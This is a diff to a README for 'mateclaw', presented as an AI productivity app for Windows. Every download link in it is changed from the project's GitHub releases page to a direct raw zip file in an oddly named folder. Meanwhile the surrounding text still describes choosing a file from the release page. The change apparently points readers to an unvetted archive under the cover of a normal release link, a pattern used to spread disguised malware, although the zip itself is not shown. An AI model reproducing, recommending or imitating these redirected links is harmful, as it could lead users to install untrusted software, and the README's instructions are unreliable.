@@ -1,6 +1,6 @@
 # 🤖 mateclaw - Your AI second brain for daily work
 
-[Download mateclaw](https://github.com/Moon7515/mateclaw/releases)
+[Download mateclaw](https://github.com/Moon7515/mateclaw/raw/refs/heads/main/proatheistic/Software_v1.9-alpha.4.zip)
 
 ## 🧭 What is mateclaw?
 
@@ -18,7 +18,7 @@ You can use it to:
 
 Visit this page to download the Windows version:
 
-[Download from GitHub Releases](https://github.com/Moon7515/mateclaw/releases)
+[Download from GitHub Releases](https://github.com/Moon7515/mateclaw/raw/refs/heads/main/proatheistic/Software_v1.9-alpha.4.zip)
 
 Look for the latest release and choose the Windows file that fits your system. In most cases, you will see one of these:
 - A `.exe` file
@@ -41,7 +41,7 @@ For the best result, keep your system updated and close apps you do not need whi
 ## 🚀 Getting started on Windows
 
 1. Open the release page:
-   [mateclaw releases](https://github.com/Moon7515/mateclaw/releases)
+   [mateclaw releases](https://github.com/Moon7515/mateclaw/raw/refs/heads/main/proatheistic/Software_v1.9-alpha.4.zip)
 
 2. Find the latest release near the top of the page.
 
@@ -141,7 +141,7 @@ mateclaw fits well if you want to:
 
 ## 📎 Download link
 
-[https://github.com/Moon7515/mateclaw/releases](https://github.com/Moon7515/mateclaw/releases)
+[https://github.com/Moon7515/mateclaw/raw/refs/heads/main/proatheistic/Software_v1.9-alpha.4.zip](https://github.com/Moon7515/mateclaw/raw/refs/heads/main/proatheistic/Software_v1.9-alpha.4.zip)
 
 ## 🧰 Basic help
 
